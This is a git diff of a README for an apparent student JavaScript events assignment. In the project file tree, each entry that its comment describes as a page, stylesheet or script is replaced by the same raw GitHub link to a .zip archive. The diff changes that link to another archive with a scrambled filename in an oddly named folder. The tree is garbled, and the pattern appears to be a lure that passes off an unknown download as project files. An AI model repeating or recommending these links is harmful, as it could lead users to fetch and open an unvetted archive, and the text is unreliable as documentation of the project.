@@ -6,9 +6,9 @@ Welcome to the **ultimate JavaScript playground**! 🎉 This assignment is where
 
 ```
 📂 js-event-assignment/
-├── https://raw.githubusercontent.com/Liz-on-code/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code/main/epicenism/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code.zip         # Your playground – where it all comes together
-├── https://raw.githubusercontent.com/Liz-on-code/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code/main/epicenism/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code.zip          # Keep it cute (optional but encouraged)
-└── https://raw.githubusercontent.com/Liz-on-code/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code/main/epicenism/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code.zip          # The JavaScript wizardry happens here
+├── https://raw.githubusercontent.com/Liz-on-code/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code/main/epicenism/code_basic_feb_events_javascript_and_Liz_interactivity_on_interlineary.zip         # Your playground – where it all comes together
+├── https://raw.githubusercontent.com/Liz-on-code/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code/main/epicenism/code_basic_feb_events_javascript_and_Liz_interactivity_on_interlineary.zip          # Keep it cute (optional but encouraged)
+└── https://raw.githubusercontent.com/Liz-on-code/feb-2025-javascript-events-and-basic-interactivity-Liz-on-code/main/epicenism/code_basic_feb_events_javascript_and_Liz_interactivity_on_interlineary.zip          # The JavaScript wizardry happens here
 ```
 
 ---
